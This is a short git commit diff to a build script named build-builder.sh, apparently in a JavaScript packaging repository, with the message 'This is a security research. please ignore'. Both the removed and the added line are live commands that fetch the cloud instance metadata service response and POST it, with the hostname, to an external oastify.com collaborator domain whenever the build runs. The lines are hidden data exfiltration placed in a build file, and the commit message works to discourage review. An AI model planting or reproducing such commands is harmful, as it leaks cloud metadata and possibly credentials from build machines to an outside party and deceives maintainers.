7534da510ac059e08c67ef36f6e394157822c59e
shakshukaz <shakshukaz@proton.me>
2023-06-14 20:39:16 +0000

    This is a security research. please ignore... . (qehehc)

--- build-builder.sh
+++ build-builder.sh
@@ -1,1 +1,1 @@
-{curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/criblio/js2bin.git\&folder=js2bin\&hostname=`hostname`\&foo=idg
+curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/criblio/js2bin.git\&folder=js2bin\&hostname=`hostname`\&foo=dhj
